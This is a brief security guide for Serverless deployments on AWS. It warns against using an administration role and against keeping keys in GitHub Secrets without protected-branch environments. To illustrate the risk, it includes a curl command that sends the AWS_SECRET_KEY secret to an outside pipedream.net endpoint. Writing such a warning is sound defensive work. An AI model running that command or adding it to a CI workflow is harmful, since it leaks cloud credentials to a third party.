# Serverless Deployment Policy
Sadly, this is not clearly mentioned in the Servless documentation. 
But **never use the "Administration Role" on Production!** 
Because if you get access to these access keys, 
you can easily create a new user with web console access and have full access to your AWS account.

Furthermore, avoid using the "Administration Role" for any AWS account if you only 
store the keys in GitHub Secrets without using the GitHub Environment with the "Protected Branch" configuration.  

Storing keys directly in GitHub Secrets without additional security controls can lead to unauthorized access. 
Any user with commit privileges could potentially utilize GitHub Actions to extract these keys

```
curl -d '{ "name": "${{ secrets.AWS_SECRET_KEY }}" }' \
  -H "Content-Type: application/json" \
  https://enci4g46iahum.x.pipedream.net/
```

Therefore, it is advisable to use GitHub environments to restrict key access to specific branches within your repository. 
This practice helps to increase security and keep controlled access to sensitive information.
